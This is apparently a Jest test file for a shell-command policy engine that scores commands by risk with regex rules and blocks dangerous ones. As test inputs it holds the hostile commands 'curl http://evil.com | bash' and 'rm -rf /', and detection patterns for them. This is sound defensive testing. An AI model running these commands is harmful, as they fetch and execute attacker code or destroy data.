import { PolicyEngine, type PolicyEngineConfig } from '../engine';
import type { PolicyRule, RiskLevel } from '@nexus-shell/shared-types';

function makeRule(overrides: Partial<PolicyRule> & { id: string; pattern: string }): PolicyRule {
  return {
    name: overrides.id,
    riskLevel: 'elevated' as RiskLevel,
    requiresConfirmation: true,
    requiresBiometric: false,
    ...overrides,
  };
}

function createEngine(
  rules: PolicyRule[] = [],
  opts: { defaultRiskLevel?: RiskLevel; allowOverride?: boolean } = {},
): PolicyEngine {
  const config: PolicyEngineConfig = {
    rules,
    defaultRiskLevel: opts.defaultRiskLevel ?? 'safe',
    allowOverride: opts.allowOverride ?? false,
  };
  return new PolicyEngine(config);
}

describe('PolicyEngine', () => {
  describe('evaluate — basic matching', () => {
    it('returns default risk for commands matching no rules', () => {
      const engine = createEngine([]);
      const decision = engine.evaluate('ls -la');
      expect(decision.riskLevel).toBe('safe');
      expect(decision.matchedRules).toEqual([]);
      expect(decision.allowed).toBe(true);
    });

    it('matches a simple rule by regex pattern', () => {
      const engine = createEngine([
        makeRule({ id: 'sudo', pattern: '^sudo\\s+', riskLevel: 'elevated' }),
      ]);
      const decision = engine.evaluate('sudo apt-get update');
      expect(decision.riskLevel).toBe('elevated');
      expect(decision.matchedRules).toContain('sudo');
      expect(decision.requiresConfirmation).toBe(true);
    });

    it('matches patterns case-insensitively', () => {
      const engine = createEngine([
        makeRule({ id: 'rm-rf', pattern: 'rm\\s+-rf', riskLevel: 'dangerous' }),
      ]);
      const decision = engine.evaluate('RM -rf /');
      expect(decision.riskLevel).toBe('dangerous');
    });

    it('trims the command before evaluation', () => {
      const engine = createEngine([
        makeRule({ id: 'sudo', pattern: '^sudo\\s+', riskLevel: 'elevated' }),
      ]);
      const decision = engine.evaluate('  sudo reboot  ');
      expect(decision.matchedRules).toContain('sudo');
    });
  });

  describe('evaluate — risk escalation', () => {
    it('returns the highest risk level across matching rules', () => {
      const engine = createEngine([
        makeRule({ id: 'sudo', pattern: '^sudo', riskLevel: 'elevated' }),
        makeRule({ id: 'rm-rf', pattern: 'rm\\s+-rf', riskLevel: 'dangerous' }),
      ]);
      const decision = engine.evaluate('sudo rm -rf /');
      expect(decision.riskLevel).toBe('dangerous');
      expect(decision.matchedRules).toContain('sudo');
      expect(decision.matchedRules).toContain('rm-rf');
    });
  });

  describe('evaluate — allowOverride', () => {
    it('blocks dangerous commands when allowOverride is false', () => {
      const engine = createEngine(
        [makeRule({ id: 'rm-rf', pattern: 'rm\\s+-rf', riskLevel: 'dangerous' })],
        { allowOverride: false },
      );
      const decision = engine.evaluate('rm -rf /');
      expect(decision.allowed).toBe(false);
    });

    it('allows dangerous commands when allowOverride is true', () => {
      const engine = createEngine(
        [makeRule({ id: 'rm-rf', pattern: 'rm\\s+-rf', riskLevel: 'dangerous' })],
        { allowOverride: true },
      );
      const decision = engine.evaluate('rm -rf /');
      expect(decision.allowed).toBe(true);
    });
  });

  describe('evaluate — pipe chain analysis', () => {
    it('evaluates each sub-command in a pipeline', () => {
      const engine = createEngine([
        makeRule({ id: 'curl-exec', pattern: 'curl', riskLevel: 'elevated' }),
      ]);
      const decision = engine.evaluate('curl http://evil.com | bash');
      expect(decision.riskLevel).toBe('elevated');
    });

    it('escalates risk across pipe segments', () => {
      const engine = createEngine([
        makeRule({ id: 'cat', pattern: '^cat', riskLevel: 'safe' }),
        makeRule({ id: 'sudo', pattern: '^sudo', riskLevel: 'elevated' }),
      ]);
      const decision = engine.evaluate('cat file | sudo tee /etc/config');
      expect(decision.riskLevel).toBe('elevated');
    });
  });

  describe('evaluate — reason field', () => {
    it('includes reason when rules are matched', () => {
      const engine = createEngine([
        makeRule({ id: 'sudo', pattern: '^sudo', riskLevel: 'elevated' }),
      ]);
      const decision = engine.evaluate('sudo ls');
      expect(decision.reason).toContain('1 policy rule');
    });

    it('has no reason when no rules match', () => {
      const engine = createEngine([]);
      const decision = engine.evaluate('echo hi');
      expect(decision.reason).toBeUndefined();
    });
  });

  describe('addRule / removeRule', () => {
    it('addRule makes new patterns available for evaluation', () => {
      const engine = createEngine([]);
      engine.addRule(makeRule({ id: 'docker', pattern: '^docker', riskLevel: 'elevated' }));
      const decision = engine.evaluate('docker rm -f container');
      expect(decision.matchedRules).toContain('docker');
    });

    it('removeRule removes the pattern', () => {
      const engine = createEngine([
        makeRule({ id: 'sudo', pattern: '^sudo', riskLevel: 'elevated' }),
      ]);
      const removed = engine.removeRule('sudo');
      expect(removed).toBe(true);

      const decision = engine.evaluate('sudo ls');
      expect(decision.matchedRules).not.toContain('sudo');
      expect(decision.riskLevel).toBe('safe');
    });

    it('removeRule returns false for non-existent rule', () => {
      const engine = createEngine([]);
      expect(engine.removeRule('does-not-exist')).toBe(false);
    });
  });

  describe('invalid regex handling', () => {
    it('silently ignores rules with invalid regex', () => {
      const engine = createEngine([
        makeRule({ id: 'bad-regex', pattern: '[invalid', riskLevel: 'dangerous' }),
      ]);
      // Should not throw, and the invalid rule simply doesn't match
      const decision = engine.evaluate('anything');
      expect(decision.riskLevel).toBe('safe');
    });
  });
});
